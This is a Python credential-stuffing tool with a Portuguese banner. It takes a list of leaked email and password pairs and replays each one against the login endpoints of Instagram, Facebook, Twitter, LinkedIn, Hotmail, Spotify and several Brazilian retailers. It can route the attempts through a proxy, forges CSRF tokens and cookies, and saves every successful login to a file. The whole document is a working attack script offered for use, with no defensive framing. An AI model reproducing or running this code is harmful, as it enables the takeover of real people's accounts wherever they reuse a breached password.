import os as sistema
import requests as requisicao
import time as tempo
import random
from colorama import Fore,Style

print(Fore.RED,Style.BRIGHT,'''
  ____ _____ ____ _____ _   _ _____ _____ 
 / ___|  ___/ ___|_   _| | | |  ___|  ___|
| |   | |_  \___ \ | | | | | | |_  | |_   
| |___|  _|  ___) || | | |_| |  _| |  _|  
 \____|_|   |____/ |_|  \___/|_|   |_|    
''',Style.RESET_ALL)
print (Fore.GREEN,Style.BRIGHT,'''                               
- By: D4RKR0N.

- Salve: Rildo Sthill - Chalie BCA - Xin0x - Plastyne - Clandestine - Luiz - Chacal - Artr0n - Don Samael - VandaTheGod.

- Contatos;

- https://www.facebook.com/J0rdan.NT
- https://www.twitter.com/D4RKR0N

+------------------------------------------------------------------------------------------+
| - Simples ferramenta em python para realizar 'credential stuffing', mas no que se trata  |
| o credential stuffing? É simplesmente um ataque na qual um hacker consegue obter uma base|     
| de dados com emails/senhas, e realiza testes em outros locais para ver se a vítima dono  |
| das credenciais 'coletadas' utiliza a mesma senha em outras redes, assim obtendo acesso  |
| em outras contas da vitima, como ML,Americanas,Submarino,Hotmail,Facebook,Twitter,etc... |
| (se a vitima utilizar a mesma senha).                                                    |
+------------------------------------------------------------------------------------------+

> Necessário ter instalado o módulo: requests,colorama.

> Esse script fará o teste em: Instagram,Facebook,Kabum,Kanui,Saraiva,Twitter,Linkedin,Hotmail,Walmart,Spotify.

> OBS: Eu estava querendo colocar do ml,americanas,casas bahia,etc, porém, devido ao captcha não foi possivel :(.
''',Style.RESET_ALL)
print("> Selecione o arquivo com os emails/senhas que deseja testar, cada CONTA tem que estar divida por quebra de linha, e o email e senha de CADA conta divididos por '|'.\n")
lista = str(input("- Informe o arquivo com os emails e senhas que deseja testar: "))

verificaexistencia = sistema.path.isfile(lista)
while(verificaexistencia == 0):
    lista = str(input("- O arquivo informado não existe, informe um arquivo existente: "))
    verificaexistencia = sistema.path.isfile(lista)
tempo.sleep(1)
print(Fore.GREEN,"- Arquivo carregado com sucesso.",Style.RESET_ALL)
f = open(lista,"r")
contas = f.read()
bc = contas.strip()
contast = bc.split("\n")
esc = str(input("- Deseja usar proxy?(1=SIM|2=NÃO): "))
while(esc != '1') and (esc != '2'):
    esc = str(input("- Digite uma opção válida, você digitou {} e não 1 nem 2: ".format(esc)))

if(esc == "1"):
    proxy = str(input("- Digite o proxy(Necessário ser HTTPS, no formato: https://ip:porta): ")).strip()
    v = proxy[0:5]
    while(v != "https"):
        proxy = str(input("- O proxy informado não é https, INFORME um proxy HTTPS: ")).strip()
        v = proxy[0:5]
    proxies = {
    "https": proxy
    }

    print(Fore.GREEN,"\n=============================================================\n- OK, iniciando ataque de credential stuffing...\n=============================================================",Style.RESET_ALL)
    tempo.sleep(5)
    for conta in contast:
        tc = conta.split('|')
        email = tc[0]
        senha = tc[1]
        print("\n---------------------------------------\nConta > {}:{}".format(email,senha))
        print("- Testando no instagram...")
        instaheaders = {
    "X-CSRFToken": "666",
    "Content-Type": "application/x-www-form-urlencoded"
    }
        inreq = requisicao.post(url='https://www.instagram.com/accounts/login/ajax/',data='username={}&password={}&queryParams=%7B%22source%22%3A%22auth_switcher%22%7D&optIntoOneTap=false'.format(email,senha),headers=instaheaders,proxies=proxies)
        c = inreq.content
        c = str(c)
        if('userId' in c) or ('checkpoint_required' in c):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > INSTAGRAM: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("\n[+] CREDENTIAL STUFFING > INSTAGRAM: {}:{}".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO INSTAGRAM.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando no Facebook...")
        fbheaders = {
        'Content-Type': 'application/x-www-form-urlencoded'
        }
        fbreq = requisicao.post(url='https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data='jazoest=2588&lsd=1&display=&enable_profile_selector=&isprivate=&legacy_return=0&profile_selector_ids=&return_session=&skip_api_login=&signed_next=&trynum=1&timezone=180&lgndim=1&lgnrnd=1&lgnjs=1&email={}&pass={}&prefill_contact_point=1&prefill_source=1&prefill_type=contact_point&first_prefill_source=browser_dropdown&first_prefill_type=contact_point&had_cp_prefilled=true&had_password_prefilled=false&ab_test_data=1'.format(email,senha), cookies={'fr':'3'},headers=fbheaders,proxies=proxies)
        e = str(fbreq.headers)
        if("checkpoint=" in e) or ('spin=' in e):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > FACEBOOK: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("\n[+] CREDENTIAL STUFFING > FACEBOOK: {}:{}".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO FACEBOOK.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando na Kabum...")
        kaheaders = {
        'Referer': 'https://www.kabum.com.br/cgi-local/site/login/login.cgi'
        }
        kabreq = requisicao.post(url='https://www.kabum.com.br/cgi-local/site/login/login.cgi',data='tmp_hash=&login={}&senha={}&login.x=44&login.y=8&funcao=login'.format(email,senha),headers=kaheaders,proxies=proxies)
        reka = str(kabreq.content)
        if('cgi-local/site/principal/home.cgi' in reka):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > KABUM: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("\n[+] CREDENTIAL STUFFING > KABUM: {}:{}".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NA KABUM.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando na Kanui...")
        kanuicookies = {
        'YII_CSRF_TOKEN': "1"
        }
        kanuiheaders = {
        'Content-Type': 'application/x-www-form-urlencoded'
        }
        kanuireq = requisicao.post(url='https://secure.kanui.com.br/customer/account/login/',data='YII_CSRF_TOKEN=1&LoginForm%5Bemail%5D={}&LoginForm%5Bpassword%5D={}'.format(email,senha),cookies=kanuicookies,headers=kanuiheaders,proxies=proxies)
        kanuih = str(kanuireq.headers)
        if('customer_logged=1' in kanuih):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > KANUI: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("\n[+] CREDENTIAL STUFFING > KANUI: {}:{}".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NA KANUI.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando na Saraiva...")
        saracookies = {
        '_ebinfo': 'lucifer'
        }
        saraheaders = {
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        sarareq = requisicao.post(url='https://www.saraiva.com.br/customer/account/loginPost/',data='login%5Busername%5D={}&login%5Bpassword%5D={}'.format(email,senha),headers=saraheaders,cookies=saracookies,proxies=proxies)
        sararesp = str(sarareq.content)
        if('is_logged_in":true' in sararesp):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > SARAIVA: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("\n[+] CREDENTIAL STUFFING > SARAIVA: {}:{}".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NA SARAIVA.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando no Twitter...")
        twheaders = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
        }
        twcookies = {
        '_twitter_sess': 'BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCBgq8ZxpAToMY3NyZl9p%250AZCIlYWQ2ZTRkMDk1NzQ3Zjc0Y2FjZGJhNjhlNWIyMDFlNDQ6B2lkIiVmYThj%250ANWU5MDhjYTU0ODg3MWI3YzEyYTdlNGVmMjQxZg%253D%253D--87992233d593347d11a5a7f7f4925dbe271ff2e9'
        }
        twreq = requisicao.post(url='https://twitter.com/sessions',data='session%5Busername_or_email%5D={}&session%5Bpassword%5D={}&authenticity_token=0ae78f20aef60fe95e7129c683950111fe16da22'.format(email,senha),cookies=twcookies,headers=twheaders,proxies=proxies)
        resp = str(twreq.content)
        if('not redirected soon, please <a href="/">use this link</a>' in resp):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > TWITTER: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("\n[+] CREDENTIAL STUFFING > TWITTER: {}:{}".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO TWITTER.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando no Linkedin...")
        csrfbypass = random.random()
        csrfbypass = str(csrfbypass)
        csrfbypass = csrfbypass[5:17]
        cookie = ('v=2&1d5e532f-65c9-4f74-80f6-{}'.format(csrfbypass))
        paramcookie = cookie[4:40]
        linkecookies = {
        'bcookie': cookie
        }
        linkeheaders = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
        }
        linkereq = requisicao.post(url='https://www.linkedin.com/uas/login-submit?loginSubmitSource=GUEST_HOME',data='session_key={}&session_password={}&isJsEnabled=true&loginCsrfParam={}&fp_data=default'.format(email,senha,paramcookie),cookies=linkecookies,headers=linkeheaders,proxies=proxies)
        respostalinke = str(linkereq.headers)
        if('sw.js' in respostalinke):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > LINKEDIN: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("\n[+] CREDENTIAL STUFFING > LINKEDIN: {}:{}".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO LINKEDIN.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando no Hotmail...")
        htcookies = {
        'MSPRequ': '',
        'MSCC': '',
        'CkTst': '',
        'wlidperf': '',
        'OParams': '',
        'MSPBack': '',
        'mkt': '',
        'mkt1': '',
        'amsc': '',
        'MSPCID': '',
        'WLOpt': '',
        'NAP': '',
        'ANON': '',
        'SDIDC': '',
        'MUID': '',
        'IgnoreCAW': '1',
        'uaid': '',
        'MSPOK': '$uuid-855efdc9-6bec-495d-aacd-954bd01b5892'
        }

        htheaders = {
        'Content-Type': 'application/x-www-form-urlencoded'
        }

        htreq = requisicao.post(url='https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1553121603&rver=7.0.6730.0&wp=LBI&wreply=https:%2f%2fwww.msn.com%2fpt-br%2fhomepage%2fSecure%2fPassport%3fru%3dhttps%253a%252f%252fwww.msn.com%252fpt-br%252f%253focid%253dmailsignout%2526pfr%253d1',data='i13=0&login={0}&loginfmt={0}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={1}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DTYnp*u8N%21Hpc67IeVKvoOTDlmV%21n9QD38bZtAloQXky8LaSfUFUD2FRvdOlUoat7eHwqD3XO89KEmcsj7FInVDouJFWhDiMgd7Hd6rFnFlPafNXbxmPE3mCbQcCOMLbTTLZgthCnL1kQ00X2ZgHRLHazIRIE7aduo7HSL8Sfmg*Qm3w%211rjKRpyrAnoXA4UKGjZsOyTne9n3oz*WnuT3f4nCqEKVx2mrsR1WzFJJYWz2hDdcchjylrlrHzvxdfRlp0p7Nka6fCg21UkPhB1s7M%24&PPSX=Pass&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&i2=1&i17=&i18=&i19='.format(email,senha),cookies=htcookies,headers=htheaders,proxies=proxies)
        respht = str(htreq.headers)
        if('PPAuth' in respht):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > HOTMAIL: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("\n[+] CREDENTIAL STUFFING > HOTMAIL: {}:{}".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO HOTMAIL.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando na Walmart...")
        walheaders = {
        'Content-Type': 'application/x-www-form-urlencoded'
        }
        walreq = requisicao.post(url='https://connect.walmart.com.br/connect/LoginService',data='signinField={0}&password={1}&connected=true&continue=https%3A%2F%2Fconnect.walmart.com.br%2Fconnect%2Fauthorize%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%3A%2F%2Fapi-ws.walmart.com.br%2Fapi%2Fwebstore%2Fauth%2Fcallback%26client_id%3Dwalmart_webstore%26type%3D%26state%3Dredirect_to%3D&clientId=walmart_webstore&signinButtonSend=Entrar&X-Tmx-session-id=1&email={0}'.format(email,senha),headers=walheaders,proxies=proxies)
        respw = str(walreq.headers)
        if('logged-in=true' in respw):
            print(Fore.YELLOW,Style.DIM,"[+] CREDENTIAL STUFFING > WALMART: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("\n[+] CREDENTIAL STUFFING > WALMART: {}:{}".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUÁRIO NÃO USA A MESMA SENHA NA WALMART.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando na Spotify...")
        pegacsrftokennovo = requisicao.get(url="https://accounts.spotify.com/",headers={ 'Content-Type': 'application/x-www-form-urlencoded' },proxies=proxies)
        csrftoken = str(pegacsrftokennovo.headers)
        csrftoken = csrftoken[1973:2053]
        spotheaders = {
        'Content-Type': 'application/x-www-form-urlencoded'
        }
        spotcookies = {
        'csrf_token': csrftoken,
        '__bon': 'MHwwfDIxNDUwMDg3Mjd8OTAwOTAzNjY1MzR8MXwxfDF8MQ=='
        }
        sptreq = requisicao.post(url='https://accounts.spotify.com/api/login',data='remember=true&username={}&password={}&recaptchaToken&csrf_token={}'.format(email,senha,csrftoken),cookies=spotcookies,headers=spotheaders,proxies=proxies)
        respspot = str(sptreq.content)
        if('displayName' in respspot):
        	print(Fore.YELLOW,Style.BRIGHT, "[+] CREDENTIAL STUFFING > SPOTIFY: {}:{}".format(email,senha),Style.RESET_ALL)
        	arquivo = open("credenciais.txt","a")
        	arquivo.write("[+] CREDENTIAL STUFFING > SPOTIFY: {}:{}\n".format(email,senha))
        else:
        	print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO SPOTIFY.",Style.RESET_ALL)
        tempo.sleep(2)

elif(esc == "2"):
    print("\n=============================================================\n- OK, iniciando ataque de credential stuffing...\n=============================================================")
    tempo.sleep(5)
    for conta in contast:
        tc = conta.split('|')
        email = tc[0]
        senha = tc[1]
        print("\n---------------------------------------\nConta > {}:{}\n".format(email,senha))
        print("- Testando no instagram...")
        instaheaders = {
    "X-CSRFToken": "666",
    "Content-Type": "application/x-www-form-urlencoded"
    }
        inreq = requisicao.post(url='https://www.instagram.com/accounts/login/ajax/',data='username={}&password={}&queryParams=%7B%22source%22%3A%22auth_switcher%22%7D&optIntoOneTap=false'.format(email,senha),headers=instaheaders)
        c = inreq.content
        c = str(c)
        if('userId' in c) or ('checkpoint_required' in c):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > INSTAGRAM: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("[+] CREDENTIAL STUFFING > INSTAGRAM: {}:{}\n".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO INSTAGRAM.",Style.RESET_ALL)
            tempo.sleep(2)
        print("\n- Testando no Facebook...")
        fbheaders = {
        'Content-Type': 'application/x-www-form-urlencoded'
        }
        fbreq = requisicao.post(url='https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data='jazoest=2588&lsd=1&display=&enable_profile_selector=&isprivate=&legacy_return=0&profile_selector_ids=&return_session=&skip_api_login=&signed_next=&trynum=1&timezone=180&lgndim=1&lgnrnd=1&lgnjs=1&email={}&pass={}&prefill_contact_point=1&prefill_source=1&prefill_type=contact_point&first_prefill_source=browser_dropdown&first_prefill_type=contact_point&had_cp_prefilled=true&had_password_prefilled=false&ab_test_data=1'.format(email,senha), cookies={'fr':'3'},headers=fbheaders)
        e = str(fbreq.headers)
        if("checkpoint=" in e) or ('spin=' in e):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > FACEBOOK: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("\n[+] CREDENTIAL STUFFING > FACEBOOK: {}:{}\n".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO FACEBOOK.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando na Kabum...")
        kaheaders = {
        'Referer': 'https://www.kabum.com.br/cgi-local/site/login/login.cgi'
        }
        kabreq = requisicao.post(url='https://www.kabum.com.br/cgi-local/site/login/login.cgi',data='tmp_hash=&login={}&senha={}&login.x=44&login.y=8&funcao=login'.format(email,senha),headers=kaheaders)
        reka = str(kabreq.content)
        if('cgi-local/site/principal/home.cgi' in reka):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > KABUM: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("\n[+] CREDENTIAL STUFFING > KABUM: {}:{}\n".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NA KABUM.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando na Kanui...")
        kanuicookies = {
        'YII_CSRF_TOKEN': "1"
        }
        kanuiheaders = {
        'Content-Type': 'application/x-www-form-urlencoded'
        }
        kanuireq = requisicao.post(url='https://secure.kanui.com.br/customer/account/login/',data='YII_CSRF_TOKEN=1&LoginForm%5Bemail%5D={}&LoginForm%5Bpassword%5D={}'.format(email,senha),cookies=kanuicookies,headers=kanuiheaders)
        kanuih = str(kanuireq.headers)
        if('customer_logged=1' in kanuih):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > KANUI: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("\n[+] CREDENTIAL STUFFING > KANUI: {}:{}\n".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NA KANUI.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando na Saraiva...")
        saracookies = {
        '_ebinfo': 'lucifer'
        }
        saraheaders = {
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        sarareq = requisicao.post(url='https://www.saraiva.com.br/customer/account/loginPost/',data='login%5Busername%5D={}&login%5Bpassword%5D={}'.format(email,senha),headers=saraheaders,cookies=saracookies)
        sararesp = str(sarareq.content)
        if('is_logged_in":true' in sararesp):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > SARAIVA: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("\n[+] CREDENTIAL STUFFING > SARAIVA: {}:{}\n".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NA SARAIVA.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando no Twitter...")
        twheaders = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
        }
        twcookies = {
        '_twitter_sess': 'BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCBgq8ZxpAToMY3NyZl9p%250AZCIlYWQ2ZTRkMDk1NzQ3Zjc0Y2FjZGJhNjhlNWIyMDFlNDQ6B2lkIiVmYThj%250ANWU5MDhjYTU0ODg3MWI3YzEyYTdlNGVmMjQxZg%253D%253D--87992233d593347d11a5a7f7f4925dbe271ff2e9'
        }
        twreq = requisicao.post(url='https://twitter.com/sessions',data='session%5Busername_or_email%5D={}&session%5Bpassword%5D={}&authenticity_token=0ae78f20aef60fe95e7129c683950111fe16da22'.format(email,senha),cookies=twcookies,headers=twheaders)
        resp = str(twreq.content)
        if('not redirected soon, please <a href="/">use this link</a>' in resp):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > TWITTER: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("\n[+] CREDENTIAL STUFFING > TWITTER: {}:{}\n".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO TWITTER.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando no Linkedin...")
        csrfbypass = random.random()
        csrfbypass = str(csrfbypass)
        csrfbypass = csrfbypass[5:17]
        cookie = ('v=2&1d5e532f-65c9-4f74-80f6-{}'.format(csrfbypass))
        paramcookie = cookie[4:40]
        linkecookies = {
        'bcookie': cookie
        }
        linkeheaders = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
        }
        linkereq = requisicao.post(url='https://www.linkedin.com/uas/login-submit?loginSubmitSource=GUEST_HOME',data='session_key={}&session_password={}&isJsEnabled=true&loginCsrfParam={}&fp_data=default'.format(email,senha,paramcookie),cookies=linkecookies,headers=linkeheaders)
        respostalinke = str(linkereq.headers)
        if('sw.js' in respostalinke):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > LINKEDIN: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("\n[+] CREDENTIAL STUFFING > LINKEDIN: {}:{}\n".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO LINKEDIN.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando no Hotmail...")
        htcookies = {
        'MSPRequ': '',
        'MSCC': '',
        'CkTst': '',
        'wlidperf': '',
        'OParams': '',
        'MSPBack': '',
        'mkt': '',
        'mkt1': '',
        'amsc': '',
        'MSPCID': '',
        'WLOpt': '',
        'NAP': '',
        'ANON': '',
        'SDIDC': '',
        'MUID': '',
        'IgnoreCAW': '1',
        'uaid': '',
        'MSPOK': '$uuid-855efdc9-6bec-495d-aacd-954bd01b5892'
        }

        htheaders = {
        'Content-Type': 'application/x-www-form-urlencoded'
        }

        htreq = requisicao.post(url='https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1553121603&rver=7.0.6730.0&wp=LBI&wreply=https:%2f%2fwww.msn.com%2fpt-br%2fhomepage%2fSecure%2fPassport%3fru%3dhttps%253a%252f%252fwww.msn.com%252fpt-br%252f%253focid%253dmailsignout%2526pfr%253d1',data='i13=0&login={0}&loginfmt={0}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={1}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DTYnp*u8N%21Hpc67IeVKvoOTDlmV%21n9QD38bZtAloQXky8LaSfUFUD2FRvdOlUoat7eHwqD3XO89KEmcsj7FInVDouJFWhDiMgd7Hd6rFnFlPafNXbxmPE3mCbQcCOMLbTTLZgthCnL1kQ00X2ZgHRLHazIRIE7aduo7HSL8Sfmg*Qm3w%211rjKRpyrAnoXA4UKGjZsOyTne9n3oz*WnuT3f4nCqEKVx2mrsR1WzFJJYWz2hDdcchjylrlrHzvxdfRlp0p7Nka6fCg21UkPhB1s7M%24&PPSX=Pass&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&i2=1&i17=&i18=&i19='.format(email,senha),cookies=htcookies,headers=htheaders)
        respht = str(htreq.headers)
        if('PPAuth' in respht):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > HOTMAIL: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("\n[+] CREDENTIAL STUFFING > HOTMAIL: {}:{}\n".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO HOTMAIL.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando na Walmart...")
        walheaders = {
        'Content-Type': 'application/x-www-form-urlencoded'
        }
        walreq = requisicao.post(url='https://connect.walmart.com.br/connect/LoginService',data='signinField={0}&password={1}&connected=true&continue=https%3A%2F%2Fconnect.walmart.com.br%2Fconnect%2Fauthorize%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%3A%2F%2Fapi-ws.walmart.com.br%2Fapi%2Fwebstore%2Fauth%2Fcallback%26client_id%3Dwalmart_webstore%26type%3D%26state%3Dredirect_to%3D&clientId=walmart_webstore&signinButtonSend=Entrar&X-Tmx-session-id=1&email={0}'.format(email,senha),headers=walheaders)
        respw = str(walreq.headers)
        if('logged-in=true' in respw):
            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > WALMART: {}:{}".format(email,senha),Style.RESET_ALL)
            arquivo = open("credenciais.txt","a")
            arquivo.write("[+] CREDENTIAL STUFFING > WALMART: {}:{}\n".format(email,senha))
        else:
            print(Fore.RED,"[-] O USUÁRIO NÃO USA A MESMA SENHA NA WALMART.",Style.RESET_ALL)
        tempo.sleep(2)
        print("\n- Testando na Spotify...")
        pegacsrftokennovo = requisicao.get(url="https://accounts.spotify.com/",headers={ 'Content-Type': 'application/x-www-form-urlencoded' })
        csrftoken = str(pegacsrftokennovo.headers)
        csrftoken = csrftoken[1973:2053]
        spotheaders = {
        'Content-Type': 'application/x-www-form-urlencoded'
        }
        spotcookies = {
        'csrf_token': csrftoken,
        '__bon': 'MHwwfDIxNDUwMDg3Mjd8OTAwOTAzNjY1MzR8MXwxfDF8MQ=='
        }
        sptreq = requisicao.post(url='https://accounts.spotify.com/api/login',data='remember=true&username={}&password={}&recaptchaToken&csrf_token={}'.format(email,senha,csrftoken),cookies=spotcookies,headers=spotheaders)
        respspot = str(sptreq.content)
        if('displayName' in respspot):
        	print(Fore.YELLOW,Style.BRIGHT, "[+] CREDENTIAL STUFFING > SPOTIFY: {}:{}".format(email,senha),Style.RESET_ALL)
        	arquivo = open("credenciais.txt","a")
        	arquivo.write("[+] CREDENTIAL STUFFING > SPOTIFY: {}:{}\n".format(email,senha))
        else:
        	print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO SPOTIFY.",Style.RESET_ALL)
        tempo.sleep(2)
arquivo.close()



